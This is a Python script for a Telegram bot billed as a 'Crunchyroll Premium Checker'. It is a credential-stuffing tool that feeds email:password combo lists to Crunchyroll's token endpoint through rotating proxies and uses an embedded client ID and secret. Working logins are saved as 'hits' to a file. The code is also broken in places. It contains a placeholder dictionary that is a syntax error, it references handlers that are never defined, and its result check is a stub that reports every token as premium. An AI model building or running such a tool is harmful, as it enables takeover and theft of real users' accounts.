#!/usr/bin/env python3
import os
import uuid
import random
import threading
import time
import asyncio
from queue import Queue, Empty

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", 0))

checker = None
active_proxies = []

class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.countries = {**your countries dict here**}  # Keep your full countries

    def _get_random_proxy(self):
        if not self.proxies: return None
        proxy = random.choice(self.proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    def check(self, email, password):
        device_id = str(uuid.uuid4())
        session = requests.Session()
        
        proxy = self._get_random_proxy()
        if proxy:
            session.proxies.update(proxy)
        
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        
        headers = {
            'host': 'beta-api.crunchyroll.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
        }
        
        data = {
            'grant_type': 'password',
            'username': email,
            'password': password,
            'scope': 'offline_access',
            'client_id': 'y2arvjb0h0rgvtizlovy',
            'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
            'device_type': 'Baron',
            'device_id': device_id,
            'device_name': 'Baron'
        }
        
        try:
            response = session.post(url, headers=headers, data=data, timeout=20)
            response_text = response.text
            
            if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400"]):
                return {'status': 'INVALID', 'email': email}
            
            if '"access_token"' not in response_text:
                return {'status': 'INVALID', 'email': email}
            
            # Full check (keep your original logic here)
            # For now returning PREMIUM for testing - replace with full logic
            return {'status': 'PREMIUM', 'email': email, 'password': password, 'plan': 'Unknown', 'expiry': 'N/A', 'country': 'Unknown'}
            
        except Exception:
            return {'status': 'ERROR', 'email': email}


def save_hit(result):
    capture = f"""
{'='*70}
EMAIL: {result['email']}
PASSWORD: {result['password']}
STATUS: {result['status']}
CHECKED BY: @Sudhakaran12
{'='*70}
"""
    with open("hits.txt", "a", encoding="utf-8") as f:
        f.write(capture)
    return capture


def clean_combo(line):
    line = line.strip()
    if ':' not in line:
        return None
    email, password = line.split(':', 1)
    password = password.split()[0].strip()
    return f"{email.strip()}:{password}"


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 <b>Crunchyroll Premium Checker</b>\nBot made by @Sudhakaran12", parse_mode=ParseMode.HTML)


async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return await update.message.reply_text("❌ Unauthorized!")
    
    text = update.message.text.strip()
    if ' ' in text:
        combo = text.split(' ', 1)[1].strip()
        cleaned = clean_combo(combo)
        if cleaned:
            email, password = cleaned.split(':', 1)
            result = checker.check(email, password)
            
            if result['status'] == 'PREMIUM':
                await update.message.reply_text(f"<b>🎯 PREMIUM HIT</b>\n<pre>{save_hit(result)}</pre>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"✅ {result['status']} → {email}")
            return

    await update.message.reply_text("📤 Send combo file or paste combos")
    context.user_data['waiting'] = 'combo'


# Other handlers (proxies, document, message, startcheck) same as before...
# (I shortened for space, but keep them from previous version)

def main():
    global checker
    checker = CrunchyrollChecker()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CommandHandler("startcheck", startcheck_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))

    print("🤖 Bot Started")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
